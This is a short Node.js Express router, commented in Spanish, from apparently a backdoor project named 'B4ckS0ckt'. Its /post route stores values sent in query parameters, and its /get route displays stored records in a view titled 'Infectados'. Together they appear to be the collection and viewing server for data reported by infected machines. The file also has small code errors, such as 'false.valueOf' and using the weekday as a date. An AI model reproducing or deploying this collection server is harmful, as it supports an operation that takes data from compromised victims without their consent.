/**
 * @version: 1.0
 * @license: MIT
 * @description: B4ckS0ckt - Server
*/

const express = require("express")
const router = express.Router()
const database = require("../models/schema")

/**
 * @description: Hacemos una funcion para toda la API/rutas: 
*/

router.get("/", async(request, response) => {
    response.status(200).json({
        success: true,
        message: "Home Page"
    })
})
router.get("/post", async(request, response) => {
    const query = request.query
    const data = await database.find()

    const date = new Date() 
    const dia = date.getDay() 
    const hora = date.getHours()
    const minutos = date.getMinutes() 
    const fecha = `${dia}:${hora}:${minutos}` 

    if (!query.info1 || !query.info2 || !query.info3 || !query.author) {
        response.status(400).json({
            success: false.valueOf,
            message: "Necesitas ingresar las query."
        })
    } else {
        database.init()
        new database({
            id: data.length,
            OneContent: query.info1,
            TwoContent: query.info2,
            ThreeContent: query.info3,
            Author: query.author,
            Fecha: fecha 
        }).save().then(() => {
            response.json({
                success: true,
                message: "Datos enviados exitosamente:",
                query
            })
        })
    }
})  
router.get('/get', async(req, res) => {
    if(req.session.isAuth == false) return await res.redirect('/');
    let query = req.query;
    if(!query.id) {
        req.flash('error', 'Tienes que seleccionar una id.');
        return await res.redirect('/infectados');
    } else {
        if(isNaN(query.id)) {
            req.flash('error', 'ID Incorrecta.');
            return await res.redirect('/infectados');
        } else {
            let db = await database.findOne({ id: query.id });
            res.render('infectado', {
                title: 'B4cks0ck - Infectados',
                db
            })
        }
    }    
})

module.exports = router
